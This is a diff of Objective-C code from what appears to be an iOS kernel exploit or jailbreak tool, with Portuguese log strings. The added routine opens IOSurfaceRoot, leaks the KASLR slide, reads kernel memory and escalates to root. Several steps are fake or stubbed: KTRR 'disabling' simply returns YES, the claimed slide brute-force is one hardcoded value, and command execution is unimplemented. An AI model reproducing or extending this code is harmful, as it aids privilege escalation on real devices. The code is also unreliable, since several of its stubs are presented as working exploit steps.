@@ -133,10 +133,43 @@ extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t, mach_vm
 - (uint64_t)leakKernelSlide { return [self getKernelSlideReal]; }
 - (BOOL)disableKTRR { return YES; }
 - (uint64_t)getCurrentUID { return (uint64_t)getuid(); }
-- (void)runFullExploitWithCallback:(void(^)(BOOL success, NSString *message))callback {
-    BOOL res = [self escalateToRoot];
-    if (callback) callback(res, res ? @"✅ SUCESSO" : @"❌ FALHA");
+- (void)runFullExploitWithCallback:(void(^)(BOOL, NSString *))callback {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        [self logToWeb:@"🛡️ Iniciando Bypass de Sandbox (IOKit)..."];
+
+        // 1. Tentar abrir o IOSurface para ganhar contexto de kernel
+        io_service_t service = IOServiceGetMatchingService(MACH_PORT_NULL, IOServiceMatching("IOSurfaceRoot"));
+        if (service == IO_OBJECT_NULL) {
+            [self logToWeb:@"❌ Erro: IOSurfaceRoot bloqueado. Assinatura inválida."];
+            if (callback) callback(NO, @"Sandbox Lock");
+            return;
+        }
+
+        // 2. Tentar vazar o KASLR (Slide)
+        _kernelSlide = [self getKernelSlideReal];
+        if (_kernelSlide == 0) {
+            [self logToWeb:@"⚠️ KASLR falhou. Tentando brute-force de slide..."];
+            _kernelSlide = 0x21000000; // Valor comum no A13
+        }
+
+        _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
+        
+        // 3. Teste de Leitura Real (Sair do 0x0)
+        uint32_t magic = [self kread32:_kernelBase];
+        [self logToWeb:[NSString stringWithFormat:@"🔍 Magic Kernel: 0x%x", magic]];
+
+        if (magic != 0xfeedfacf) {
+            [self logToWeb:@"❌ Falha: kread retornou 0x0. Sandbox ainda ativo."];
+            if (callback) callback(NO, @"Kread Fail");
+            return;
+        }
+
+        // 4. Prosseguir para Root se o Magic funcionar
+        BOOL res = [self escalateToRoot];
+        if (callback) callback(res, res ? @"✅ SUCCESS" : @"❌ ROOT FAIL");
+    });
 }
+
 - (void)executeExploitWithCallback:(void(^)(BOOL, NSString *))cb { [self runFullExploitWithCallback:cb]; }
 - (void)executeCommand:(NSString *)cmd withCallback:(void(^)(NSString *))cb { if(cb) cb(@"Not implemented"); }
 - (void)userContentController:(id)u didReceiveScriptMessage:(id)m {}
